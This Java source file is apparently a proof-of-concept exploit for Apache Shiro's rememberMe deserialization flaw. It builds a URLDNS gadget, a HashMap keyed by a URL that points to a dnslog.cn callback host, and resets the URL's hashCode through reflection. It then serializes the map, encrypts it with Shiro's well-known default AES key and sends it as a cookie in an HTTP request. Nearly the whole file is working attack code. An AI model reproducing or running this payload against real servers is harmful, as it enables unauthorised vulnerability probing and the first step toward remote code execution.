package com.core;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNSTest {
	public static void main(String[] args)throws Exception {
		HashMap<URL,String> map=new HashMap<URL, String>();
		URL url=new URL("http://aaa.jhkjpe.dnslog.cn");
		Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
		f.setAccessible(true);
		f.set(url,0xdeadbeef);
		map.put(url, "rmb122");
		f.set(url,-1);
//		ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("out.bin"));
		ByteArrayOutputStream baos=new ByteArrayOutputStream();
		ObjectOutputStream oos=new ObjectOutputStream(baos);
		oos.writeObject(map);
//		oos.writeObject(map);
//		ObjectInputStream ois=new ObjectInputStream(new FileInputStream("out.bin"));
//		ois.readObject();
//		FileInputStream fis=new FileInputStream("out.bin");
		byte[] bytes=baos.toByteArray();
		baos.close();
		oos.close();
		String cookie=AesCrypt.encrypt("kPH+bIxk5D2deZiIxcaaaA==", bytes);
		HttpRequest.request("", cookie);
	}
}
